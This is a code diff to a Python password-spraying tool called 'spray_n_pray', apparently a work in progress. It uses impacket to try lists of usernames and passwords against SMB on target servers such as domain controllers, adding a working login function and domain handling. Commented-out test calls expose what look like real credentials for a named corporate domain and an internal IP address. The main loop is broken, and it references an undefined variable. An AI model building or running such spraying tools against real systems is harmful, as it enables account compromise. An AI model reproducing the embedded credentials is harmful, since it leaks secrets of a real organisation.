@@ -1,18 +1,32 @@
 #!/usr/bin/env python3
 import argparse, sys
 import impacket
+from impacket.smbconnection import SMBConnection
+
+
+def smb_login(target, domain, user, password):
+    try:
+        smbclient = SMBConnection(target, target)
+    except:
+        return False
+    try:
+        smbclient.login(user, password, domain)
+        return 1  # Logon Success!
+    except:       # Logon Failure :/
+        return 2
 
 def main():
     parser = argparse.ArgumentParser('spray_n_pray')
     parser.add_argument('protocol', help='Protocol to auth against: smb') #, ldap, krb5, mssql
     parser.add_argument('-t',  '--targets', help='File listing of targets to authenticate against (ex. list of DC\'s)')
+    parser.add_argument('-d',  '--domain', help='Target domain. Ex. firenation.com')
     parser.add_argument('-u',  '--userlist', help='List of users to spray')
     parser.add_argument('-p',  '--passlist', help='List of password attempts')
     parser.add_argument('-wg',  '--global_wait', help='Seconds to wait between auth attempts (global). Default: none')
     parser.add_argument('-wt',  '--target_wait', help='Seconds to wait between auth attempts (just per target). Default: none')
 
     args = parser.parse_args()   
-    if args.targets and args.userlist and args.passlist:
+    if args.targets and args.userlist and args.passlist and args.domain:
         try:
             with open(args.targets) as targetfile:
                 targets = targetfile.readlines()
@@ -21,10 +35,12 @@ def main():
                 users = userfile.readlines()
                 users = [x.strip() for x in users]
             with open(args.passlist) as passfile:
-                users = userfile.readlines()
-                users = [x.strip() for x in users]
-        except:
-            print('[-] --targets, --userlist, and --passlist must be line-separated files')
+                passwds = passfile.readlines()
+                passwds = [x.strip() for x in passwds]
+            domain = args.domain
+        except Exception as e:
+            print(e)
+            print('[-] --targets, --userlist, and --passlist must be line-separated files. Oh. And you need a --domain.')
             sys.exit()
     else:
         print('[-] Required: --targets, --userlist, --passlist')
@@ -37,7 +53,7 @@ def main():
             sys.exit()
     else:
         gwait = 0
-    if args.tlobal_wait:
+    if args.global_wait:
         try:
             twait = int(args.global_wait)
         except:
@@ -46,7 +62,16 @@ def main():
     else:
         twait = 0
      
+    print('[*] Password attack: trying '+str(len(passwds))+' passwords for '+str(len(users))+' users, distributed across '+str(len(targets))+' servers')
 
+    # Main logic
+    #attempt = smb_login('127.0.0.1', 'corp.checkfree.com', 'jake', 'J@k3jake')
+    #attempt = smb_login('10.141.68.131', 'corp.checkfree.com', 'jake', 'J@k3jake')
+    for user in users:
+        if attempt:
+            print(attempt)
+        else:
+            print('connection failed')
 
 if __name__ == "__main__":
     main()
